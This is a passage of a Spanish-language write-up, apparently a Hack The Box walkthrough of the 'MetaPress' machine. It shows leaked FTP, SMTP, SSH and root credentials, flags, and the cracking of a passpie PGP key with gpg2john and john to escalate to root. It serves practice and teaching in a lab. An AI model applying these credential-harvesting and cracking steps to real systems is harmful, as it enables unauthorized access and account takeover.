+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'FS_METHOD'</span><span class="token punctuation">,</span> <span class="token string">'ftpext'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'FTP_USER'</span><span class="token punctuation">,</span> <span class="token string">'metapress.htb'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'FTP_PASS'</span><span class="token punctuation">,</span> <span class="token string">'9NYS_ii@FyL_p5M2NvJ'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'FTP_HOST'</span><span class="token punctuation">,</span> <span class="token string">'ftp.metapress.htb'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'FTP_BASE'</span><span class="token punctuation">,</span> <span class="token string">'blog/'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'FTP_SSL'</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'AUTH_KEY'</span><span class="token punctuation">,</span>         <span class="token string">'?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_KEY'</span><span class="token punctuation">,</span>  <span class="token string">'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_KEY'</span><span class="token punctuation">,</span>    <span class="token string">'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'NONCE_KEY'</span><span class="token punctuation">,</span>        <span class="token string">'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'AUTH_SALT'</span><span class="token punctuation">,</span>        <span class="token string">'[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'SECURE_AUTH_SALT'</span><span class="token punctuation">,</span> <span class="token string">'&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'LOGGED_IN_SALT'</span><span class="token punctuation">,</span>   <span class="token string">'4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf='</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'NONCE_SALT'</span><span class="token punctuation">,</span>       <span class="token string">'.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**
+ * WordPress Database Table prefix.
+ */</span>
+<span class="token variable">$table_prefix</span> <span class="token operator">=</span> <span class="token string">'wp_'</span><span class="token punctuation">;</span>
+
+<span class="token comment">/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'WP_DEBUG'</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** Absolute path to the WordPress directory. */</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">defined</span><span class="token punctuation">(</span> <span class="token string">'ABSPATH'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">define</span><span class="token punctuation">(</span> <span class="token string">'ABSPATH'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">/** Sets up WordPress vars and included files. */</span>
+<span class="token keyword">require_once</span> <span class="token constant">ABSPATH</span> <span class="token punctuation">.</span> <span class="token string">'wp-settings.php'</span><span class="token punctuation">;</span>
+</span></code></pre>
+<p>En el como ppodemos observar existe un <strong>usuario ftp</strong> con los credenciales <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code>.</p>
+<p>&nbsp;</p>
+<h2 id="accedemos-al-ftp">9. Accedemos al ftp</h2>
+<p>Intentamos acceder con dichos credenciales al servicio <strong>ftp</strong>:</p>
+<pre><code>ftp 10.10.11.186 
+</code></pre>
+<p>Podemos observar el contenido de dicho repositivorio, viendo que existen dos directorios:</p>
+<pre><code># cd 
+
+    drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+    drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+</code></pre>
+<p>Si accedemos a la carpeta de <code>blog</code> vemos lo siguiente:</p>
+<pre><code># cd blog
+# ls
+
+    -rw-r--r--   1 metapress.htb metapress.htb      405 Feb  6  2020 index.php
+    -rw-r--r--   1 metapress.htb metapress.htb    19915 Feb 12  2020 license.txt
+    -rw-r--r--   1 metapress.htb metapress.htb     7278 Jun 26  2020 readme.html
+    -rw-r--r--   1 metapress.htb metapress.htb     7101 Jul 28  2020 wp-activate.php
+    drwxr-xr-x   9 metapress.htb metapress.htb     4096 Oct  5 14:12 wp-admin
+    -rw-r--r--   1 metapress.htb metapress.htb      351 Feb  6  2020 wp-blog-header.php
+    -rw-r--r--   1 metapress.htb metapress.htb     2328 Oct  8  2020 wp-comments-post.php
+    -rw-r--r--   1 metapress.htb metapress.htb     2032 Jun 23  2022 wp-config.php
+    -rw-r--r--   1 metapress.htb metapress.htb     2913 Feb  6  2020 wp-config-sample.php
+    drwxr-xr-x   6 metapress.htb metapress.htb     4096 Oct  5 14:12 wp-content
+    -rw-r--r--   1 metapress.htb metapress.htb     3939 Jul 30  2020 wp-cron.php
+    drwxr-xr-x  25 metapress.htb metapress.htb    12288 Oct  5 14:12 wp-includes
+    -rw-r--r--   1 metapress.htb metapress.htb     2496 Feb  6  2020 wp-links-opml.php
+    -rw-r--r--   1 metapress.htb metapress.htb     3300 Feb  6  2020 wp-load.php
+    -rw-r--r--   1 metapress.htb metapress.htb    49831 Nov  9  2020 wp-login.php
+    -rw-r--r--   1 metapress.htb metapress.htb     8509 Apr 14  2020 wp-mail.php
+    -rw-r--r--   1 metapress.htb metapress.htb    20975 Nov 12  2020 wp-settings.php
+    -rw-r--r--   1 metapress.htb metapress.htb    31337 Sep 30  2020 wp-signup.php
+    -rw-r--r--   1 metapress.htb metapress.htb     4747 Oct  8  2020 wp-trackback.php
+    -rw-r--r--   1 metapress.htb metapress.htb     3236 Jun  8  2020 xmlrpc.php
+</code></pre>
+<p>Nos llama la atención la carpeta <code>wp-admin</code>, por lo que listamos su contenido:</p>
+<pre><code># cd wp-admin
+# ls
+
+    -rw-r--r--   1 metapress.htb metapress.htb    24543 Feb 22  2021 about.php
+    -rw-r--r--   1 metapress.htb metapress.htb     4837 Oct 15  2020 admin-ajax.php
+    -rw-r--r--   1 metapress.htb metapress.htb     2832 Jan 29  2020 admin-footer.php
+    -rw-r--r--   1 metapress.htb metapress.htb      406 Feb  6  2020 admin-functions.php
+    -rw-r--r--   1 metapress.htb metapress.htb     8620 Oct 29  2020 admin-header.php
+    -rw-r--r--   1 metapress.htb metapress.htb    12133 Jul 22  2020 admin.php
+    -rw-r--r--   1 metapress.htb metapress.htb     1671 Feb  6  2020 admin-post.php
+    -rw-r--r--   1 metapress.htb metapress.htb     3826 Oct  8  2020 async-upload.php
+    -rw-r--r--   1 metapress.htb metapress.htb     9850 Jan 28  2021 authorize-application.php
+    -rw-r--r--   1 metapress.htb metapress.htb    11418 Sep 18  2020 comment.php
+</code></pre>
+<p>Vemos que existe un archivo llamado <code>admin.php</code>, por lo que lo obtenemos para observar su contenido:</p>
+<pre><code>get admin.php
+</code></pre>
+<p>Observamos que al principio del fichero hay lo siguinte:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/*
+ * This script will be used to send an email to all our users when ready for launch
+*/</span>
+
+<span class="token keyword">use</span> <span class="token package">PHPMailer<span class="token punctuation">\</span>PHPMailer<span class="token punctuation">\</span>PHPMailer</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">PHPMailer<span class="token punctuation">\</span>PHPMailer<span class="token punctuation">\</span>SMTP</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">PHPMailer<span class="token punctuation">\</span>PHPMailer<span class="token punctuation">\</span>Exception</span><span class="token punctuation">;</span>
+
+<span class="token keyword">require</span> <span class="token string">'PHPMailer/src/Exception.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string">'PHPMailer/src/PHPMailer.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string">'PHPMailer/src/SMTP.php'</span><span class="token punctuation">;</span>
+
+<span class="token variable">$mail</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PHPMailer</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">SMTPDebug</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>                               
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">isSMTP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            
+
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Host</span> <span class="token operator">=</span> <span class="token string">"mail.metapress.htb"</span><span class="token punctuation">;</span>
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">SMTPAuth</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                          
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Username</span> <span class="token operator">=</span> <span class="token string">"jnelson@metapress.htb"</span><span class="token punctuation">;</span>                 
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Password</span> <span class="token operator">=</span> <span class="token string">"Cb4_JmWM8zUZWMu@Ys"</span><span class="token punctuation">;</span>                           
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">SMTPSecure</span> <span class="token operator">=</span> <span class="token string">"tls"</span><span class="token punctuation">;</span>                           
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Port</span> <span class="token operator">=</span> <span class="token number">587</span><span class="token punctuation">;</span>                                   
+
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">From</span> <span class="token operator">=</span> <span class="token string">"jnelson@metapress.htb"</span><span class="token punctuation">;</span>
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">FromName</span> <span class="token operator">=</span> <span class="token string">"James Nelson"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$mail</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addAddress</span><span class="token punctuation">(</span><span class="token string">"info@metapress.htb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></code></pre>
+<p>Es decir, vemos lo que pueden ser una credenciales <code>jnelson:Cb4_JmWM8zUZWMu@Ys</code>.</p>
+<p>&nbsp;</p>
+<h2 id="accedemos-como-el-usuario-jnelson">10. Accedemos como el usuario jnelson</h2>
+<p>Accedemos mediante el servicio <strong>ssh</strong> con dicho usuario y contraseña, observando que conseguimos acceso al sistema:</p>
+<pre><code>ssh jnelson@10.10.11.186 
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="flag-de-usuario">11. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>16803612e80d4252e71267e0c570f529</em></p>
+<p>&nbsp;</p>
+<h2 id="escalada-de-privilegios">12. Escalada de privilegios</h2>
+<p>Indagando por el sistema observamos una carpeta con el nombre <code>.passpie</code> en el directorio del usuario. <strong>Passpie</strong> es un gestor de contraseñas, y su comando para listar las claves guardadas es <code># passpie</code>, obteniendo el siguiente resultado:</p>
+<pre><code>╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════
+</code></pre>
+<p>Por lo que intentamos obtener la contraseña de root mediante el sigueinte comando, pero no somos capaces de obtenerla:</p>
+<pre><code>passpie export pass
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="observamos-archivos-del-sistema">13. Observamos archivos del sistema</h2>
+<p>Vemos que existe un archivo <code>/home/jnelson/.passpie/.keys</code> que contiene un clave privada cifrada mediante <strong>pgp</strong>. Nos la copiamos a nuestro equipo e intentamos un ataque por fuerza bruta. Para ello primero la convertimos a un formato entendible para <strong>jhon</strong> mediante el siguiente comando:</p>
+<pre><code>gpg2john key &gt; gpg.john
+</code></pre>
+<p>Lanzamos entonces el ataque:</p>
+<pre><code>john -w=/usr/share/wordlists/rockyou.txt gpg.john
+</code></pre>
+<p>Obtenemos como resultado lo siguiente:</p>
+<pre><code>blink182         (Passpie)
+1g 0:00:00:02 DONE (2023-03-01 11:32) 0.3649g/s 61.31p/s 61.31c/s 61.31C/s ginger..987654
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="obtención-de-contraseñas">14. Obtención de contraseñas</h2>
+<p>Intentamos de nuevo obtener las contraseñas a través del gestor <strong>passpie</strong>, introduciendo la contraseña rescatada anteriormente:</p>
+<pre><code>touch pass
+passpie export pass 
+</code></pre>
+<p>Obteniendo como resultado lo siguiente:</p>
+<pre><code>credentials:
+- comment: ''
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
+- comment: ''
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
+handler: passpie
+version: 1.0
+</code></pre>
+<p>Por lo que nos hacemos root mediante <code># su root</code> e introducimos la credencial <code>p7qfAZt4_A1xo_0x</code>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-root">15. Flag de root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>88570c370dc564d1cb5aee187980f08a</em></p>
+
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
